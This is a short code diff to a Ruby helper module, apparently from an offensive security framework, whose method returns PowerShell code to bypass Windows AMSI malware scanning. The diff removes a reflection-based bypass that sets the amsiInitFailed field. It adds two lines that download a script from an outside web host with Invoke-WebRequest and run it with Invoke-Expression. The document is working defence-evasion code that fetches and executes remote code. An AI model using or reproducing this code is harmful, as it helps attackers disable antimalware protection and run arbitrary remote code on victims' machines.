@@ -91,8 +91,8 @@ module Powershell
     # @return [String] PowerShell code to bypass AMSI
     def self.bypass_amsi()
       %q{
-        $Ref=[Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils');
-        $Ref.GetField('amsiIn'+'itFailed','NonPublic,Static').SetValue($null,$true);
+        $accessAMBY = Invoke-WebRequest https://amsi-fail.azurewebsites.net/api/Generate -UseBasicParsing;
+        Invoke-Expression $accessAMBY.Content;
       }
     end
 
